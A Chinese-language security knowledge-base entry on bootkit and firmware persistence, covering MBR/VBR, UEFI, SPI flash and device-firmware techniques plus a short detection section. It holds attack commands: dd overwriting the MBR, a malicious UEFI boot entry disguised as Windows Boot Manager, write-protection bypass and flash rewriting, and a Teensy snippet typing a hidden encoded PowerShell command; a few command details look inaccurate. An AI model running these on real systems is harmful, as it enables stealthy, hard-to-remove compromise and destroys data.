---
id: 07-005
title: "Bootkit与固件持久化 (Bootkit & Firmware Persistence)"
category: 持久化
category_en: Persistence
difficulty: ★★★★★
tools: "UEFI, SPI Flash, Chipsec, Flashrom, RWEverything"
last_updated: 2026-05
tags: ["persistence", "bootkit", "startup-autostart", "account-persistence"]
subdomain: persistence
nist_csf: ["PR.AC-01", "DE.CM-01"]
mitre_attack: ["T1543", "T1547", "T1136", "T1053"]
---
# Bootkit与固件持久化 (Bootkit & Firmware Persistence)

## 概述

Bootkit 和固件级持久化是最高级的持久化技术之一。攻击者将恶意代码植入系统引导过程（MBR/VBR）、UEFI 固件或设备固件中，使其在操作系统加载前或独立于操作系统执行。此类持久化难以检测、难以清除，格式化硬盘甚至重装系统都无法移除。

## 核心技能

### 1. MBR/VBR Bootkit

```bash
# MBR (Master Boot Record) 操作
# 读取 MBR (512 bytes)
dd if=/dev/sda of=mbr.bin bs=512 count=1

# 备份原始 MBR
dd if=/dev/sda of=mbr_backup.bin bs=512 count=1

# 写入恶意 MBR (需物理访问或 root 权限)
dd if=malicious_mbr.bin of=/dev/sda bs=512 count=1

# VBR (Volume Boot Record) 操作
# 读取 VBR
dd if=/dev/sda1 of=vbr.bin bs=512 count=1

# Bootkit 工作原理:
# 1. 感染 MBR 或 VBR，保留原始引导代码
# 2. 将恶意代码放在磁盘的保留扇区 (通常在 MBR 之后)
# 3. 系统引导时，恶意代码在 OS 内核加载前执行
# 4. 恶意代码加载原始引导代码，实现透明劫持
```

### 2. UEFI Bootkit

```bash
# UEFI 固件分析
# 使用 Chipsec 检查 UEFI 配置
python chipsec_main.py -m common.bios_wp

# 读取 SPI Flash 固件 (需 root 和硬件访问)
flashrom -p internal -r firmware_backup.rom
flashrom -p internal -r bios.bin

# UEFI 启动变量操作
# 列出 UEFI 启动项
efibootmgr -v

# 创建恶意 UEFI 启动项
efibootmgr -c -d /dev/sda -p 1 -L "Windows Boot Manager" -l \\EFI\\boot\\malicious.efi

# 修改启动顺序
efibootmgr -o 0001,0000

# Windows UEFI Bootkit 概念:
# 1. 替换 \EFI\Microsoft\Boot\bootmgfw.efi 为恶意版本
# 2. 恶意 efi 加载原始 bootmgfw.efi (改名后)
# 3. 实现 SMM (System Management Mode) 劫持
```

### 3. SPI Flash 固件持久化

```bash
# SPI Flash 写保护检测
# Chipsec 检测 BIOS 写保护
python chipsec_main.py -m common.spi_desc

# 尝试禁用写保护
# 通过芯片组寄存器操作
setpci -s 0:1f.0 F0.B=00

# 读取和写入 SPI Flash
# 注意: 擦除和写入操作因芯片而异
flashrom -p internal -E  # 擦除
flashrom -p internal -w modified_bios.rom  # 写入

# 将恶意代码插入固件中的方法:
# 1. DXE (Driver Execution Environment) 驱动替换
# 2. UEFI Boot Script 修改
# 3. NVRAM 变量持久化
# 4. ACPI 表注入
```

### 4. 设备固件持久化

```bash
# 硬盘固件持久化 (具备物理访问能力)
# 使用 Flash 工具读取硬盘固件
# hdparm 读取硬盘信息
hdparm -I /dev/sda

# NVMe 固件读取
nvme id-ctrl /dev/nv0 -o firmware.bin

# 网络设备固件 (NIC Option ROM)
# 网卡 PXE Option ROM 注入
# 网卡每次 PXE 启动时执行恶意代码

# 鼠标/键盘固件 (Teensy 设备)
# 使用 Teensy 模拟键盘输入
# Arduino 代码:
# void setup() {
#   Keyboard.begin();
#   delay(3000);
#   Keyboard.press(KEY_LEFT_GUI);
#   Keyboard.press('r');
#   delay(500);
#   Keyboard.releaseAll();
#   Keyboard.println("powershell -W Hidden -enc BASE64");
# }
```

### 5. Bootkit 检测与清除

```bash
# UEFI 固件完整性检查
# 读取固件并计算哈希
sha256sum firmware_backup.rom

# 与已知干净版本对比

# 使用 Chipsec 检测 UEFI 篡改
python chipsec_main.py -m common.uefi.s3bootscript

# MBR 完整性检查
# 读取 MBR 并与已知正常值对比
# 正常 MBR 的最后 2 字节固定为 0x55AA

# 安全清除固件 Bootkit
# 1. 从 SPI Flash 重新刷新固件 (厂商工具)
# 2. 使用安全擦除工具
# 3. 在某些情况下只能更换主板

# Windows UEFI 安全启动 (Secure Boot) 防御
# 检查安全启动状态
Confirm-SecureBootUEFI
```

## Bootkit 技术对比

| 技术 | 隐蔽性 | 持久性 | 检测难度 | 实现难度 | 清除难度 |
|:---|:---:|:---:|:---:|:---:|:---:|
| MBR Bootkit | 中 | 高 | 中 | 中 | 高 |
| VBR Bootkit | 中 | 高 | 中 | 中 | 高 |
| UEFI Bootkit | 极高 | 极高 | 高 | 极高 | 极高 |
| SPI Flash | 极高 | 极高 | 极高 | 极高 | 极高 |
| 设备固件 | 高 | 高 | 高 | 极高 | 极高 |
| 网卡 Option ROM | 高 | 中 | 高 | 高 | 高 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Chipsec | UEFI/固件安全分析框架 | https://github.com/chipsec/chipsec |
| Flashrom | SPI Flash 读写工具 | https://flashrom.org/ |
| RWEverything | 硬件寄存器读写工具 | http://rweverything.com/ |
| UEFITool | UEFI 固件编辑 | https://github.com/LongSoft/UEFITool |
| efiXplorer | UEFI 固件逆向 IDA 插件 | https://github.com/binarly-io/efiXplorer |

## 参考资源

- [MITRE ATT&CK — Pre-OS Boot (T1542)](https://attack.mitre.org/techniques/T1542/)
- [Bootkit: The Evolution of Persistence](https://www.crowdstrike.com/blog/bootkits-persistence-techniques/)
- [UEFI Firmware Security — Binarly Research](https://binarly.io/)
- [Chipsec Hardware Security Testing Guide](https://chipsec.github.io/)
- [ESXi Args — Bootkit & Firmware Analysis](https://esxiargs.medium.com/)
